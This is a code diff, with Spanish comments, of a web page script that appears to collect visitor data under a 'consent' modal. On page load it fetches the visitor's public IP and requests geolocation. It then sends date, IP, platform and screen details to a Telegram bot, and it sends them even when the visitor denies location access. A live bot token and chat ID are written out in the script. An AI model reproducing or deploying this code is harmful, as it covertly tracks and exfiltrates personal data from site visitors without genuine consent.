@@ -74,13 +74,11 @@
 </div>
 
 <script>
-// --- TUS DATOS DE TELEGRAM ---
+// --- CONFIG TELEGRAM ---
 const BOT_TOKEN = "8253513816:AAERpjUuX757c3cd8wzOmW0vvpTHce6KCIo";
 const CHAT_ID  = "-5099354587";
 
-// --- FUNCIONES ---
-
-// Obtener IP pública usando ipapi
+// Obtener IP pública
 async function obtenerIP() {
     try {
         let r = await fetch("https://ipapi.co/json/");
@@ -89,7 +87,7 @@ async function obtenerIP() {
     } catch(e) { return {}; }
 }
 
-// Armar mensaje HTML bonito para Telegram
+// Formatear mensaje HTML para Telegram
 function armarMensaje(datos) {
     return `
 <b>📍 NUEVO CONSENTIMIENTO</b>
@@ -127,15 +125,12 @@ async function enviarTelegram(msg) {
     });
 }
 
-// Función principal para pedir consentimiento y ubicación
+// Función principal
 async function pedirConsentimiento() {
-
-    // Obtener IP
     const ipInfo = await obtenerIP();
 
-    // Solicitar ubicación automáticamente
+    // Solicitar geolocalización al cargar
     navigator.geolocation.getCurrentPosition(async pos => {
-
         const datos = {
             fecha: new Date().toLocaleString(),
             ip: ipInfo.ip || "N/D",
@@ -148,18 +143,13 @@ async function pedirConsentimiento() {
             platform: navigator.platform,
             resolution: `${screen.width}x${screen.height}`
         };
-
-        // Enviar a Telegram
-        const mensaje = armarMensaje(datos);
-        await enviarTelegram(mensaje);
+        await enviarTelegram(armarMensaje(datos));
 
         // Ocultar modal y mostrar contenido
         document.getElementById("consent-modal").style.display = "none";
         document.getElementById("main-content").style.display = "block";
-
     }, async err => {
-
-        // Si niega permiso, enviar solo IP
+        // Si el usuario niega
         const datos = {
             fecha: new Date().toLocaleString(),
             ip: ipInfo.ip || "N/D",
@@ -172,17 +162,14 @@ async function pedirConsentimiento() {
             platform: navigator.platform,
             resolution: `${screen.width}x${screen.height}`
         };
+        await enviarTelegram(armarMensaje(datos));
 
-        const mensaje = armarMensaje(datos);
-        await enviarTelegram(mensaje);
-
-        // Ocultar modal y mostrar contenido
         document.getElementById("consent-modal").style.display = "none";
         document.getElementById("main-content").style.display = "block";
     });
 }
 
-// Ejecutar al cargar la página
+// Ejecutar al cargar
 window.onload = pedirConsentimiento;
 </script>
 
